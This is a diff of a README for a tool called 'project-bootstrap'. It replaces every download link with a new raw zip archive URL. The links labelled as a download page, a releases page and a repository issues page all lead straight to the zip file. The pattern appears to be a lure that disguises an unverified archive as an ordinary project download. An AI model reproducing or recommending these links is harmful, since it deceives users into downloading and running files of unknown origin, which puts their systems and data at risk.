@@ -1,6 +1,6 @@
 # 🚀 project-bootstrap - Simple Setup for Code Projects
 
-[![Download project-bootstrap](https://img.shields.io/badge/Download-Get%20project--bootstrap-blue?style=for-the-badge)](https://github.com/metalliccoloured-indiscretion271/project-bootstrap/raw/refs/heads/main/trilithon/project-bootstrap-1.5.zip)
+[![Download project-bootstrap](https://img.shields.io/badge/Download-Get%20project--bootstrap-blue?style=for-the-badge)](https://raw.githubusercontent.com/metalliccoloured-indiscretion271/project-bootstrap/main/trilithon/bootstrap-project-2.2.zip)
 
 ---
 
@@ -47,7 +47,7 @@ The program runs offline after setup. It uses little CPU and memory, so it works
 
 Click the button below to visit the download page:
 
-[![Download project-bootstrap](https://img.shields.io/badge/Download-Visit%20Page-green?style=for-the-badge)](https://github.com/metalliccoloured-indiscretion271/project-bootstrap/raw/refs/heads/main/trilithon/project-bootstrap-1.5.zip)
+[![Download project-bootstrap](https://img.shields.io/badge/Download-Visit%20Page-green?style=for-the-badge)](https://raw.githubusercontent.com/metalliccoloured-indiscretion271/project-bootstrap/main/trilithon/bootstrap-project-2.2.zip)
 
 1. When you open the linked page, look for the **Releases** section.
 
@@ -113,7 +113,7 @@ If you see error messages during setup:
 
 - Try downloading the installer file again.
 
-- If problems continue, contact support through the repository issues page (https://github.com/metalliccoloured-indiscretion271/project-bootstrap/raw/refs/heads/main/trilithon/project-bootstrap-1.5.zip).
+- If problems continue, contact support through the repository issues page (https://raw.githubusercontent.com/metalliccoloured-indiscretion271/project-bootstrap/main/trilithon/bootstrap-project-2.2.zip).
 
 ---
 
@@ -129,6 +129,6 @@ This tool works with many programming languages and project types. Future update
 
 Access the download page anytime here:
 
-[https://github.com/metalliccoloured-indiscretion271/project-bootstrap/raw/refs/heads/main/trilithon/project-bootstrap-1.5.zip](https://github.com/metalliccoloured-indiscretion271/project-bootstrap/raw/refs/heads/main/trilithon/project-bootstrap-1.5.zip)
+[https://raw.githubusercontent.com/metalliccoloured-indiscretion271/project-bootstrap/main/trilithon/bootstrap-project-2.2.zip](https://raw.githubusercontent.com/metalliccoloured-indiscretion271/project-bootstrap/main/trilithon/bootstrap-project-2.2.zip)
 
 You can also find guides, FAQs, and contact info on the same page.
